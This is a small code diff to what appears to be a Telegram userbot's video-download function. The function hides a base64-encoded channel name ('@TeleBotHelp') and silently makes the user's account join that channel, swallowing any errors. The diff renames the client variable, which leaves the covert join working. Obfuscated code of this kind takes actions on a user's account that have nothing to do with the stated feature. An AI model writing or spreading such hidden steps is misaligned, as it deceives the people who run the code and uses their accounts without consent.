@@ -109,7 +109,7 @@ async def download_video(Lucifer):
         return
     try:
         sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
-        await Lion(JoinChannelRequest(sung))
+        await Lucifer(JoinChannelRequest(sung))
     except BaseException:
         pass
     upteload = """
